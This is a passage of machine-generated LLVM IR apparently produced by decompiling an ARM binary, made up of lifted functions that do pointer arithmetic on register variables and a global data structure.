  store i32 %v0_11c90, i32* %v2_11c90, align 4
  %v2_11c94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11c94, i32* %r4.global-to-local, align 4
  %v1_11c98 = load i32, i32* @r0, align 4
  ret i32 %v1_11c98

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 0, 15, 16, 17, 18, 19, 20, 2, 1 }
  uselistorder i32 15, { 12, 0, 8, 5, 1, 11, 6, 7, 4, 9, 10, 2, 3 }
  uselistorder i32 52, { 1, 3, 9, 10, 7, 11, 12, 13, 14, 8, 4, 15, 16, 2, 17, 0, 18, 19, 5, 6 }
}

define i32 @function_11ca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ca0:
  %r3.global-to-local = alloca i32, align 4
  %v0_11ca0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ca0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11ca0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11ca0, %bb
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r3.global-to-local, align 4
  %v4_11cc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 84) to i32*), align 4
  store i32 %v4_11cc4, i32* @lr, align 4
  %v4_11cd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 10728) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 10728), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_11cf0 = inttoptr i32 %v4_11cd0 to i32*
  store i32 1, i32* %v2_11cf0, align 4
  %v0_11cf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cf4 = load i32, i32* @lr, align 4
  %v2_11cf4 = inttoptr i32 %v1_11cf4 to i32*
  store i32 %v0_11cf4, i32* %v2_11cf4, align 4
  %v0_11cf8 = call i32 @function_11c3c()
  ret i32 0

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_11d10(i32 %arg1) local_unnamed_addr {
dec_label_pc_11d10:
  %v0_11d10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d10, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11d10
  %v2_11d10 = load i32, i32* @r4, align 4
  %v8_11d10 = ashr i32 %v2_11d10, %arg1
  %v9_11d10 = and i32 %v8_11d10, %arg1
  %v2_11d14 = load i32, i32* @ip, align 4
  %v8_11d14 = lshr i32 %v2_11d14, %v9_11d10
  %v9_11d14 = and i32 %v8_11d14, %v9_11d10
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11d10, %bb
  %v0_11d20 = phi i32 [ %v9_11d14, %bb ], [ %arg1, %dec_label_pc_11d10 ]
  %v0_11d24 = call i32 @function_f150()
  %v1_11d28 = inttoptr i32 %v0_11d24 to i32*
  %v2_11d28 = load i32, i32* %v1_11d28, align 4
  %v1_11d2c = add i32 %v0_11d20, 4
  %v2_11d2c = inttoptr i32 %v1_11d2c to i32*
  %v3_11d2c = load i32, i32* %v2_11d2c, align 4
  %v1_11d30 = add i32 %v2_11d28, 8
  %v2_11d30 = inttoptr i32 %v1_11d30 to i32*
  %v3_11d30 = load i32, i32* %v2_11d30, align 4
  %v2_11d34 = add i32 %v3_11d30, %v3_11d2c
  ret i32 %v2_11d34

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11d40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11d40:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11d40 = load i32, i32* @r4, align 4
  store i32 %v3_11d40, i32* %stack_var_-36, align 4
  %v6_11d40 = load i32, i32* @r5, align 4
  %v15_11d40 = load i32, i32* @r8, align 4
  %v18_11d40 = load i32, i32* @sb, align 4
  %v21_11d40 = load i32, i32* @sl, align 4
  %v24_11d40 = load i32, i32* @fp, align 4
  %v27_11d40 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %sl.global-to-local, align 4
  %v4_11d50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 104) to i32*), align 4
  store i32 %v4_11d50, i32* %r3.global-to-local, align 4
  %v1_11d54 = inttoptr i32 %v4_11d50 to i32*
  %v2_11d54 = load i32, i32* %v1_11d54, align 4
  store i32 %v2_11d54, i32* %r2.global-to-local, align 4
  %v2_11d58 = icmp eq i32 %v2_11d54, 0
  %v0_11d60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br i1 %v2_11d58, label %dec_label_pc_11f2c, label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11d40
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_11d70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 156) to i32*), align 4
  store i32 %v4_11d70, i32* @lr, align 4
  store i32 %v2_11d54, i32* %r1.global-to-local, align 4
  %v1_11db8 = inttoptr i32 %v4_11d70 to i32*
  %v2_11db850 = load i32, i32* %v1_11db8, align 4
  %v4_11dbc51 = mul i32 %v2_11db850, 32
  %v5_11dbc52 = add i32 %v4_11dbc51, %v2_11d54
  store i32 %v5_11dbc52, i32* %r3.global-to-local, align 4
  %v3_11dc054 = icmp ult i32 %v2_11d54, %v5_11dbc52
  br i1 %v3_11dc054, label %dec_label_pc_11d7c, label %dec_label_pc_11f2c.loopexit

dec_label_pc_11d7c:                               ; preds = %dec_label_pc_11d6c, %dec_label_pc_11db4
  %v0_11d9455 = phi i32 [ %v1_11db4, %dec_label_pc_11db4 ], [ %v2_11d54, %dec_label_pc_11d6c ]
  %v1_11d7c = inttoptr i32 %v0_11d9455 to i32*
  %v2_11d7c = load i32, i32* %v1_11d7c, align 4
  store i32 %v2_11d7c, i32* %r3.global-to-local, align 4
  %v7_11d80 = icmp eq i32 %v2_11d7c, 7
  br i1 %v7_11d80, label %dec_label_pc_11d88, label %dec_label_pc_11db4

dec_label_pc_11d88:                               ; preds = %dec_label_pc_11d7c
  %v1_11d88 = add i32 %v0_11d9455, 20
  %v2_11d88 = inttoptr i32 %v1_11d88 to i32*
  %v3_11d88 = load i32, i32* %v2_11d88, align 4
  store i32 %v3_11d88, i32* %r3.global-to-local, align 4
  %v1_11d8c = add i32 %v0_11d9455, 28
  %v2_11d8c = inttoptr i32 %v1_11d8c to i32*
  %v3_11d8c = load i32, i32* %v2_11d8c, align 4
  store i32 %v3_11d8c, i32* @r6, align 4
  %v1_11d94 = add i32 %v0_11d9455, 16
  %v2_11d94 = inttoptr i32 %v1_11d94 to i32*
  %v3_11d94 = load i32, i32* %v2_11d94, align 4
  store i32 %v3_11d94, i32* %r3.global-to-local, align 4
  %v1_11d98 = add i32 %v0_11d9455, 8
  %v2_11d98 = inttoptr i32 %v1_11d98 to i32*
  %v3_11d98 = load i32, i32* %v2_11d98, align 4
  store i32 %v3_11d98, i32* %r1.global-to-local, align 4
  %tmp64 = icmp ule i32 %v3_11d8c, %arg2
  %arg2.v3_11d8c = select i1 %tmp64, i32 %arg2, i32 %v3_11d8c
  store i32 %arg2.v3_11d8c, i32* %fp.global-to-local, align 4
  %v2_11dd0 = icmp eq i32 %v3_11d8c, 0
  br i1 %v2_11dd0, label %dec_label_pc_11df8, label %bb

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11d7c
  %v1_11db4 = add i32 %v0_11d9455, 32
  store i32 %v1_11db4, i32* %r1.global-to-local, align 4
  %v2_11db8 = load i32, i32* %v1_11db8, align 4
  %v4_11dbc = mul i32 %v2_11db8, 32
  %v5_11dbc = add i32 %v4_11dbc, %v2_11d54
  store i32 %v5_11dbc, i32* %r3.global-to-local, align 4
  %v3_11dc0 = icmp ult i32 %v1_11db4, %v5_11dbc
  br i1 %v3_11dc0, label %dec_label_pc_11d7c, label %dec_label_pc_11db8.dec_label_pc_11f2c.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_11d88
  %v2_11dd4 = add i32 %v3_11d8c, -1
  br label %dec_label_pc_11dfc

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11d88, %dec_label_pc_11f2c
  %v1_11dfc.pre = phi i32 [ %v1_11dfc.pre.pre, %dec_label_pc_11f2c ], [ %v0_11d60, %dec_label_pc_11d88 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_11f2c ], [ %v3_11d88, %dec_label_pc_11d88 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_11f2c ], [ %v3_11d94, %dec_label_pc_11d88 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_11f2c ], [ %v3_11d98, %dec_label_pc_11d88 ]
  br label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %bb, %dec_label_pc_11df8
  %storemerge66 = phi i32 [ %v2_11dd4, %bb ], [ 0, %dec_label_pc_11df8 ]
  %v0_11dfc = phi i32 [ %v2_11dd4, %bb ], [ 0, %dec_label_pc_11df8 ]
  %storemerge = phi i32 [ %v3_11d8c, %bb ], [ 1, %dec_label_pc_11df8 ]
  %storemerge65 = phi i32 [ %v3_11d8c, %bb ], [ 1, %dec_label_pc_11df8 ]
  %v1_11dfc = phi i32 [ %v0_11d60, %bb ], [ %v1_11dfc.pre, %dec_label_pc_11df8 ]
  %stack_var_-52.3 = phi i32 [ %v3_11d88, %bb ], [ %stack_var_-52.0, %dec_label_pc_11df8 ]
  %stack_var_-48.3 = phi i32 [ %v3_11d94, %bb ], [ %stack_var_-48.0, %dec_label_pc_11df8 ]
  %stack_var_-44.3 = phi i32 [ %v3_11d98, %bb ], [ %stack_var_-44.0, %dec_label_pc_11df8 ]
  store i32 %storemerge66, i32* %r0.global-to-local, align 4
  store i32 %storemerge65, i32* @r1, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_11dfc = add i32 %v1_11dfc, %v0_11dfc
  store i32 %v2_11dfc, i32* @r0, align 4
  %v0_11e00 = call i32 @function_b4a8()
  store i32 %v0_11e00, i32* %r0.global-to-local, align 4
  %v1_11e04 = load i32, i32* @r4, align 4
  %v2_11e04 = mul i32 %v1_11e04, %v0_11e00
  store i32 %v2_11e04, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v0_11e0c = load i32, i32* %sl.global-to-local, align 4
  %v2_11e0c = add i32 %v0_11e0c, 72
  %v3_11e0c = inttoptr i32 %v2_11e0c to i32*
  %v4_11e0c = load i32, i32* %v3_11e0c, align 4
  store i32 %v4_11e0c, i32* %r3.global-to-local, align 4
  %v1_11e10 = inttoptr i32 %v4_11e0c to i32*
  %v2_11e10 = load i32, i32* %v1_11e10, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_11e18 = add i32 %stack_var_-52.3, 1168
  %v1_11e20 = load i32, i32* %fp.global-to-local, align 4
  %v2_11e1c = add i32 %v1_11e18, %v2_11e04
  %v2_11e20 = add i32 %v2_11e1c, %v2_11e10
  %v2_11e24 = add i32 %v2_11e20, %v1_11e20
  store i32 %v2_11e24, i32* %r0.global-to-local, align 4
  %v1_11e28 = call i32 @function_f4a4(i32 %v2_11e24)
  %v1_11e34 = sub i32 0, %v1_11e20
  store i32 10216, i32* %r4.global-to-local, align 4
  %v2_11e2c = add i32 %v1_11e28, 1167
  %v1_11e3c = add i32 %v2_11e2c, %v1_11e20
  %v2_11e40 = and i32 %v1_11e3c, %v1_11e34
  store i32 %v2_11e40, i32* @r5, align 4
  %v1_11e48 = load i32, i32* %sl.global-to-local, align 4
  %v3_11e48 = add i32 %v1_11e48, 10216
  %v4_11e48 = inttoptr i32 %v3_11e48 to i32*
  store i32 62, i32* %v4_11e48, align 4
  %v0_11e50 = load i32, i32* @r5, align 4
  %v1_11e50 = load i32, i32* %sb.global-to-local, align 4
  %v2_11e50 = add i32 %v1_11e50, %v0_11e50
  store i32 %v2_11e50, i32* %ip.global-to-local, align 4
  %v0_11e54 = load i32, i32* %sl.global-to-local, align 4
  %v1_11e54 = load i32, i32* %r4.global-to-local, align 4
  %v2_11e54 = add i32 %v1_11e54, %v0_11e54
  store i32 %v2_11e54, i32* %r4.global-to-local, align 4
  %v2_11e58 = add i32 %v0_11e54, 11504
  store i32 %v2_11e58, i32* %r8.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_11e50, i32* @r0, align 4
  %v2_11e6c = add i32 %v2_11e54, 16
  %v3_11e6c = inttoptr i32 %v2_11e6c to i32*
  store i32 %v2_11e50, i32* %v3_11e6c, align 4
  %v0_11e70 = load i32, i32* %sb.global-to-local, align 4
  %v1_11e70 = load i32, i32* %r8.global-to-local, align 4
  %v2_11e70 = add i32 %v1_11e70, 40
  %v3_11e70 = inttoptr i32 %v2_11e70 to i32*
  store i32 %v0_11e70, i32* %v3_11e70, align 4
  %v0_11e74 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e74 = trunc i32 %v0_11e74 to i8
  %v2_11e74 = load i32, i32* %r4.global-to-local, align 4
  %v3_11e74 = add i32 %v2_11e74, 20
  %v4_11e74 = inttoptr i32 %v3_11e74 to i8*
  store i8 %v1_11e74, i8* %v4_11e74, align 1
  %v0_11e78 = load i32, i32* %r4.global-to-local, align 4
  %v1_11e78 = add i32 %v0_11e78, 8
  store i32 %v1_11e78, i32* @r4, align 4
  %v0_11e7c = call i32 @function_bfd0()
  %v0_11e84 = load i32, i32* @r4, align 4
  %v1_11e84 = load i32, i32* @r5, align 4
  %v2_11e84 = inttoptr i32 %v1_11e84 to i32*
  store i32 %v0_11e84, i32* %v2_11e84, align 4
  %v0_11e88 = load i32, i32* @r5, align 4
  store i32 %v0_11e88, i32* %r0.global-to-local, align 4
  store i32 73368, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_11e88, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_d6d4.386 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_11e9c = load i32, i32* %sl.global-to-local, align 4
  %v2_11e9c = add i32 %v0_11e9c, 84
  %v3_11e9c = inttoptr i32 %v2_11e9c to i32*
  %v4_11e9c = load i32, i32* %v3_11e9c, align 4
  store i32 %v4_11e9c, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10728, i32* %r1.global-to-local, align 4
  %v2_11ea8 = add i32 %v0_11e9c, 60
  %v3_11ea8 = inttoptr i32 %v2_11ea8 to i32*
  %v4_11ea8 = load i32, i32* %v3_11ea8, align 4
  store i32 %v4_11ea8, i32* %r0.global-to-local, align 4
  %v3_11eb0 = add i32 %v0_11e9c, 10728
  %v4_11eb0 = inttoptr i32 %v3_11eb0 to i32*
  store i32 64, i32* %v4_11eb0, align 4
  %v1_11eb8 = load i32, i32* %r8.global-to-local, align 4
  %v2_11eb8 = add i32 %v1_11eb8, 20
  %v3_11eb8 = inttoptr i32 %v2_11eb8 to i32*
  store i32 %stack_var_-44.3, i32* %v3_11eb8, align 4
  %v1_11ec0 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ec0 = add i32 %v1_11ec0, 24
  %v3_11ec0 = inttoptr i32 %v2_11ec0 to i32*
  store i32 %stack_var_-48.3, i32* %v3_11ec0, align 4
  %v1_11ec8 = load i32, i32* %r0.global-to-local, align 4
  %v2_11ec8 = inttoptr i32 %v1_11ec8 to i32*
  store i32 1, i32* %v2_11ec8, align 4
  %v1_11ed0 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ed0 = add i32 %v1_11ed0, 28
  %v3_11ed0 = inttoptr i32 %v2_11ed0 to i32*
  store i32 %stack_var_-52.3, i32* %v3_11ed0, align 4
  %v0_11ed8 = load i32, i32* @r6, align 4
  %v2_11ed8 = icmp eq i32 %v0_11ed8, 0
  %v1_11edc = load i32, i32* %r8.global-to-local, align 4
  %v2_11edc = add i32 %v1_11edc, 44
  %v3_11edc = inttoptr i32 %v2_11edc to i32*
  store i32 1, i32* %v3_11edc, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_11ee4 = load i32, i32* %sl.global-to-local, align 4
  %v1_11ee4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ee4 = add i32 %v1_11ee4, %v0_11ee4
  store i32 %v2_11ee4, i32* %r2.global-to-local, align 4
  %v1_11ee8 = load i32, i32* @r6, align 4
  br i1 %v2_11ed8, label %.thread22, label %bb41

.thread22:                                        ; preds = %dec_label_pc_11dfc
  store i32 %v1_11ee8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v1_11ef423 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ef424 = add i32 %v1_11ef423, 32
  %v3_11ef425 = inttoptr i32 %v2_11ef424 to i32*
  store i32 %v1_11ee8, i32* %v3_11ef425, align 4
  br label %bb42

bb41:                                             ; preds = %dec_label_pc_11dfc
  %v2_11eec = add i32 %v1_11ee8, -1
  store i32 %v2_11eec, i32* %r0.global-to-local, align 4
  %v1_11ef4 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ef4 = add i32 %v1_11ef4, 32
  %v3_11ef4 = inttoptr i32 %v2_11ef4 to i32*
  store i32 %v1_11ee8, i32* %v3_11ef4, align 4
  %v1_11ef8 = load i32, i32* @r6, align 4
  store i32 %v1_11ef8, i32* @r1, align 4
  br label %bb42

bb42:                                             ; preds = %.thread22, %bb41
  %v0_11efc = load i32, i32* %r8.global-to-local, align 4
  %v1_11efc = load i32, i32* %r2.global-to-local, align 4
  %v2_11efc = add i32 %v1_11efc, 28
  %v3_11efc = inttoptr i32 %v2_11efc to i32*
  store i32 %v0_11efc, i32* %v3_11efc, align 4
  %v0_11f00 = load i32, i32* %r2.global-to-local, align 4
  %v1_11f00 = load i32, i32* %ip.global-to-local, align 4
  %v2_11f00 = inttoptr i32 %v1_11f00 to i32*
  store i32 %v0_11f00, i32* %v2_11f00, align 4
  %v0_11f04 = load i32, i32* %r0.global-to-local, align 4
  %v1_11f04 = load i32, i32* %r3.global-to-local, align 4
  %v2_11f04 = add i32 %v1_11f04, %v0_11f04
  store i32 %v2_11f04, i32* @r0, align 4
  br i1 %v2_11ed8, label %bb43, label %bb44

bb43:                                             ; preds = %bb42
  %v1_11f08 = load i32, i32* @r1, align 4
  store i32 %v1_11f08, i32* @r6, align 4
  br label %bb44

bb44:                                             ; preds = %bb42, %bb43
  %v0_11f0c = call i32 @function_b4a8()
  %v0_11f10 = load i32, i32* @r6, align 4
  %v2_11f10 = load i32, i32* %sb.global-to-local, align 4
  %v3_11f10 = mul i32 %v0_11f10, %v0_11f0c
  %v4_11f10 = add i32 %v2_11f10, %v3_11f10
  store i32 %v4_11f10, i32* @r0, align 4
  %v0_11f14 = load i32, i32* %fp.global-to-local, align 4
  %v2_11f14 = icmp ult i32 %v0_11f14, 16
  %v0_11f14. = select i1 %v2_11f14, i32 16, i32 %v0_11f14
  store i32 %v0_11f14., i32* @r1, align 4
  %v2_11f24 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11f24, i32* @r4, align 4
  store i32 %v6_11d40, i32* @r5, align 4
  store i32 %v15_11d40, i32* %r8.global-to-local, align 4
  store i32 %v18_11d40, i32* %sb.global-to-local, align 4
  store i32 %v21_11d40, i32* %sl.global-to-local, align 4
  store i32 %v24_11d40, i32* %fp.global-to-local, align 4
  store i32 %v27_11d40, i32* @lr, align 4
  %v0_11f28 = call i32 @function_11c3c()
  store i32 %v0_11f28, i32* %r0.global-to-local, align 4
  %v0_11f34.pre = load i32, i32* @ip, align 4
  %v1_11dfc.pre.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11f2c

dec_label_pc_11db8.dec_label_pc_11f2c.loopexit_crit_edge: ; preds = %dec_label_pc_11db4
  br label %dec_label_pc_11f2c.loopexit

dec_label_pc_11f2c.loopexit:                      ; preds = %dec_label_pc_11db8.dec_label_pc_11f2c.loopexit_crit_edge, %dec_label_pc_11d6c
  br label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f2c.loopexit, %dec_label_pc_11d40, %bb44
  %v1_11dfc.pre.pre = phi i32 [ %v0_11d60, %dec_label_pc_11f2c.loopexit ], [ %v0_11d60, %dec_label_pc_11d40 ], [ %v1_11dfc.pre.pre.pre, %bb44 ]
  %v0_11f34 = phi i32 [ %arg2, %dec_label_pc_11f2c.loopexit ], [ %arg2, %dec_label_pc_11d40 ], [ %v0_11f34.pre, %bb44 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_11f34, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11df8

; uselistorder directives
  uselistorder i32 %v1_11ee8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11e54, { 1, 0 }
  uselistorder i32 %v2_11e50, { 1, 0, 2 }
  uselistorder i32 %v1_11e20, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11db4, { 2, 1, 0 }
  uselistorder i32 %v3_11d8c, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_11d9455, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_11db8, { 1, 0 }
  uselistorder i32 %v0_11d60, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11d54, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13, 0, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 5, 7, 8, 9, 10, 11, 4, 0, 1, 2 }
  uselistorder i32 ()* @function_11c3c, { 1, 0 }
  uselistorder i32 10728, { 0, 2, 1 }
  uselistorder i32 60, { 2, 3, 1, 4, 11, 12, 13, 14, 15, 16, 5, 9, 10, 6, 17, 18, 7, 8, 0 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 (i32)* @function_f4a4, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_b4a8, { 1, 0, 6, 2, 5, 7, 4, 3 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_11f2c, { 0, 2, 1 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_11dfc, { 1, 0 }
  uselistorder label %dec_label_pc_11df8, { 1, 0 }
  uselistorder label %dec_label_pc_11d7c, { 1, 0 }
}

define i32 @function_11f4c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11f4c:
  %v0_11f4c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f4c, label %.thread3, label %.thread7

.thread3:                                         ; preds = %dec_label_pc_11f4c
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_11f4c
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_11f70() local_unnamed_addr {
dec_label_pc_11f70:
  %v2_11f78 = call i32 @function_11d40(i32 8, i32 16)
  ret i32 %v2_11f78
}

define i32 @function_11f7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_11f7c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v4_11f88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 156) to i32*), align 4
  %v4_11f90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 104) to i32*), align 4
  store i32 %v4_11f90, i32* %r1.global-to-local, align 4
  %v1_11f94 = add i32 %arg1, 44
  %v2_11f94 = inttoptr i32 %v1_11f94 to i32*
  %v3_11f94 = load i32, i32* %v2_11f94, align 4
  %v1_11f98 = add i32 %arg1, 28
  %v2_11f98 = inttoptr i32 %v1_11f98 to i32*
  %v3_11f98 = load i32, i32* %v2_11f98, align 4
  store i32 %v3_11f98, i32* %r2.global-to-local, align 4
  %v2_11f9c = inttoptr i32 %v4_11f88 to i32*
  store i32 %v3_11f94, i32* %v2_11f9c, align 4
  %v0_11fa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11fa0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11fa0 = inttoptr i32 %v1_11fa0 to i32*
  store i32 %v0_11fa0, i32* %v2_11fa0, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_11fac(i32 %arg1) local_unnamed_addr {
dec_label_pc_11fac:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11fac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11fac, label %bb, label %dec_label_pc_11fac..thread_crit_edge

dec_label_pc_11fac..thread_crit_edge:             ; preds = %dec_label_pc_11fac
  %v0_11fb8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

bb:                                               ; preds = %dec_label_pc_11fac
  %v1_11fac = load i32, i32* @ip, align 4
  %v2_11fac = load i32, i32* %r0.global-to-local, align 4
  %v3_11fac = mul i32 %v2_11fac, %v1_11fac
  %v2_11fb0 = load i32, i32* @r8, align 4
  %v4_11fb0 = and i32 %v2_11fb0, %v3_11fac
  store i32 %v4_11fb0, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11fac..thread_crit_edge, %bb
  %v0_11fb8 = phi i32 [ %v0_11fb8.pre, %dec_label_pc_11fac..thread_crit_edge ], [ %v4_11fb0, %bb ]
  store i32 %v0_11fb8, i32* @r4, align 4
  %v1_11fbc = add i32 %v0_11fb8, 40
  store i32 %v1_11fbc, i32* %r2.global-to-local, align 4
  %v1_11fc0 = inttoptr i32 %v1_11fbc to i32*
  %v2_11fc0 = load i32, i32* %v1_11fc0, align 4
  store i32 %v2_11fc0, i32* %r2.global-to-local, align 4
  %v3_11fc0 = add i32 %v0_11fb8, 44
  %v4_11fc0 = inttoptr i32 %v3_11fc0 to i32*
  %v5_11fc0 = load i32, i32* %v4_11fc0, align 4
  store i32 %v5_11fc0, i32* %r3.global-to-local, align 4
  %v0_11fc4 = call i32 @function_f150()
  store i32 %v0_11fc4, i32* %r0.global-to-local, align 4
  %v1_11fc8 = inttoptr i32 %v0_11fc4 to i32*
  %v2_11fc8 = load i32, i32* %v1_11fc8, align 4
  store i32 %v2_11fc8, i32* %r1.global-to-local, align 4
  %v3_11fcc = mul i32 %v5_11fc0, 8
  store i32 %v3_11fcc, i32* %r3.global-to-local, align 4
  %v1_11fd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_11fd0 = add i32 %v1_11fd0, %v0_11fc4
  store i32 %v2_11fd0, i32* %r0.global-to-local, align 4
  %v3_11fd4 = add i32 %v3_11fcc, %v2_11fc8
  %v4_11fd4 = inttoptr i32 %v3_11fd4 to i32*
  store i32 %v2_11fd0, i32* %v4_11fd4, align 4
  %v0_11fd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11fd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11fd8 = add i32 %v1_11fd8, %v0_11fd8
  store i32 %v2_11fd8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_11fe0 = add i32 %v2_11fd8, 4
  %v5_11fe0 = inttoptr i32 %v4_11fe0 to i8*
  store i8 1, i8* %v5_11fe0, align 1
  %v0_11fe4 = load i32, i32* @r4, align 4
  %v1_11fe4 = add i32 %v0_11fe4, 20
  store i32 %v1_11fe4, i32* %r1.global-to-local, align 4
  %v1_11fe8 = inttoptr i32 %v1_11fe4 to i32*
  %v2_11fe8 = load i32, i32* %v1_11fe8, align 4
  store i32 %v2_11fe8, i32* @r1, align 4
  %v3_11fe8 = add i32 %v0_11fe4, 24
  %v4_11fe8 = inttoptr i32 %v3_11fe8 to i32*
  %v5_11fe8 = load i32, i32* %v4_11fe8, align 4
